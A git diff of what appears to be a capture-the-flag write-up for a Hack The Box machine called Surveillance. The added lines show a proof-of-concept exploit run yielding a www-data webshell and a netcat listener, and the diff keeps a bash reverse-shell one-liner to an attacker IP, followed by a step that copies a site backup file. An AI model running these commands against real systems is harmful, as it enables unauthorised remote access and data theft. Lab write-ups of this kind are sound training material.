@@ -46,9 +46,25 @@ The main change is at the writePayloadToTempFile Function:
 
 Instead of files=files is a proxy used. So check if you got the right one and not the forked poc. 
 
+Exploit using poc:
+```
+python3 poctest.py http://surveillance.htb
+[-] Get temporary folder and document root ...
+[-] Write payload to temporary file ...
+[-] Trigger imagick to write shell ...
+[-] Done, enjoy the shell
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Start listener on attacker
+```
+nc -nlvp 1337
+```
+
 Upgrading this webshell 
 ```
-bash -c "bash -i >& /dev/tcp/10.10.14.13/1337 0>&1"
+$ bash -c "bash -i >& /dev/tcp/10.10.14.13/1337 0>&1"
 ```
 
 Copy the backup file surveillance--2023-10-17-202801--v4.4.14.sql.zip (~/html/craft/storage/backups)
